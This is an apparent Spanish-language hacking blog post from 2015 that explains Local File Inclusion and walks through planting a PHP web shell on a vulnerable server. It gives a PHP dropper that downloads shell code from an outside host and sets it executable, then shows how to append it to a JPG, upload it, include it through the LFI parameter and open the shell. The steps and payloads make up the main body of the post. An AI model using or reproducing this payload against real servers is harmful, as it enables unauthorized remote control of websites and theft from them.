@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>WebShell Mediante Local File Inclusion Y Jpg - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreaker¿Que es un Local File Inclusion?&nbsp;Local File Inclusion, o traducido al castellano inclusion local de archivos, se trata de la &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/10/webshell-mediante-lfi-y-jpg/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">WebShell Mediante Local File Inclusion Y Jpg</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-10T23:59:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:59 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div style="text-align: center;"><img src="http://leicarumors.com/wp-content/uploads/2013/09/LFI-Leica-Fotografie-International-app-version-2.0.1-released.png" height="400" width="400" /></div><div style="text-align: right;"><br />by hdbreaker</div><div style="text-align: right;"><br /></div><br /><div style="text-align: center;"><b>¿Que es un Local File Inclusion?</b>&nbsp;</div><br />Local File Inclusion, o traducido al castellano inclusion local de archivos, se trata de la inclusion de ficheros locales, es decir, ficheros que se encuentran en el mismo servidor de la web con este tipo de fallo, a diferencia de Remote File Inclusion que incluye ficheros alojados en otros servidores. Es consecuencia de un fallo en la programacion de la página, mal filtrado de los que se incluye al usar funciones en PHP para incluir archivos.<br />Ejemplo de incusion de ficheros locales:<br /><br />http://web.com/index.php?page=empresa<b>.</b>php<br />http://web.com/index.php?page=contacto.php<br /><br />Funciones PHP más usadas que permiten inclusión de ficheros: include "fichero"; require "fichero"; include_once "fichero"; require_once "fichero";  En este post explicare como subir shell dentro de un servidor por medio de un jpg, para explotarlo por medio de LFI.<br /><br />Para profundizar recomiendo la siguiente lectura:<br /><a href="http://wiki.elhacker.net/bugs-y-exploits/nivel-web/lfi">http://wiki.elhacker.net/bugs-y-exploits/nivel-web/lfi</a><br /><br />Empecemos:<br /><br />1) Necesitamos 3 cosas una shell.php (con el contenido de nuestra webshell preferida),<br />una imagen q llame la atención yo elegi sexy.jpg y un archivo shell.txt con la siguiente String<br /><br /><pre class="brush: php">&lt;?php copy("http://servidor.com/shell.txt","nombreshell.php"); chmod("nombreshell.php",0755); ?&gt;<br /></pre><br /><br /><div style="text-align: center;"><img src="http://i48.tinypic.com/119uez4.jpg" height="361" onclick="zoomToggle('640px','361px','100%','100%',this);" width="640" /></div><br />Como vemos en la imagen tenemos una foto muy llamativa y un archivo shell.txt con el siguiente string<br /><br /><pre class="brush: php">&lt;?php copy("http://servidor.com/shell.txt","nombreshell.php"); chmod("nombreshell.php",0755); ?&gt;<br /><br /></pre>yo lo configure de la siguiente manera ya que es un laboratorio local.<br /><br /><pre class="brush: php">&lt;? copy("http://192.168.1.1/shell.txt","shell.php"); chmod("shell.php",0755); ?&gt;<br /><br /></pre><br />El string en php hace lo siguiente:<br />Copia el contenido de shell.txt situada en nuestro servidor dentro de shell.php <br />(lo crea dentro de servidor vulnerable) y le asigna permisos 755<br /><br />Abrimos nuestro terminal y nos situamos en la carpeta donde tenemos la foto sexy.jpg y shell.txt<br />y tipeamos: <br /><br /><pre class="brush: bash">cat shell.txt &gt;&gt; sexy.jpg<br /><br /></pre><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/6ir96d.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Todo termina correctamente, y si hacemos un cat a sexy.jpg podemos ver el Source Incluido en ella<br /><br /><pre class="brush: bash">cat sexy.jpg<br /><br /></pre><br /><div style="text-align: center;"><img src="http://i48.tinypic.com/wjz4og.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Abrimos sexy.jpg y vemos q la imagen abre sin ningun problema<br /><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/ncfbx5.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Ahora nos resta subir sexy.jpg a un servidor Vulnerable a LFI e incluir la Imagen para q se ejecute su contenido php.<br /><br />(Asumo que ya tiene acceso a AdminPanel y existe un Upload en "X" servidor con una Vulnerabilidad LFI)<br /><br />http://WebVulnerable/LFI.php?Parametro=sexy.jpg<br /><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/1z5rhns.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />veremos que algunos caracteres aparecen en el navegador (estos son los caracteres Internos del jpg)<br /><br />luego simplemente visitamos nuestra shell con la url correspondiente<br /><br />http://WebVulnerable/shell.php<br /><br /><div style="text-align: center;"><img src="http://i49.tinypic.com/2hq9jdy.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br /><div style="text-align: right;">Happy Hacking!</div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-10T23:59:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:59 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/10/webshell-mediante-lfi-y-jpg/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/10/webshell-mediante-lfi-y-jpg/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/10/como-encontrar-el-admin-panel/" title="Previous Post: Cómo encontrar el Admin Panel">&laquo; Cómo encontrar el Admin Panel</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/11/backdoor-via-inyeccion/" title="Next Post: Backdoor via Inyeccion">Backdoor via Inyeccion &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
